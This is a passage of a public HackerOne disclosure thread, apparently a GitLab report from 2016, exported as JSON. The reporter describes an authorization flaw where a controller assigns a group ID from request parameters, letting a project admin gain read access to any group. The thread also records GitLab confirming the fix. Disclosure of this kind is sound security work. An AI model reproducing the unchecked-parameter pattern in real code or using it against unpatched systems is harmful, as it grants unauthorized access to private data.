class=\"ss\"\u003e:group_id\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"n\"\u003elink\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egroup_access\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:group_access\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003elink\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esave\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe first three lines are almost exactly the same code as used in the \u003ccode\u003eProjects::GroupLinksController\u003c/code\u003e. When \u003ccode\u003esave\u003c/code\u003e is called, the admin of the project gets read access to that group identified by \u003ccode\u003eparams[:group_id]\u003c/code\u003e, resulting in the same issue as described in the initial report. Let me know if you have any questions!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-20T03:14:18.710Z","updated_at":"2016-04-20T03:16:03.163Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1038954,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi Jobert,\n\nThe fix has been published. Thank you very much for reporting. Feel free to let me know if there are any additional suggestions. \n\nBest regards,\n\nJosé Torres\nLead Service Engineer\nGitLab, Inc.","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eThe fix has been published. Thank you very much for reporting. Feel free to let me know if there are any additional suggestions. \u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003c/p\u003e\n\n\u003cp\u003eJosé Torres\u003cbr\u003e\nLead Service Engineer\u003cbr\u003e\nGitLab, Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-26T22:06:54.101Z","updated_at":"2016-06-26T22:06:54.101Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1041527,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T19:48:20.337Z","updated_at":"2016-06-27T19:48:20.337Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1091615,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-27T19:48:28.034Z","updated_at":"2016-07-27T19:48:28.034Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2278,"category":"team","content":"Additional information on our internal communication can be viewed at https://gitlab.com/gitlab-org/gitlab-ce/issues/15330.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAdditional information on our internal communication can be viewed at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/15330\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F15330\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/15330\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}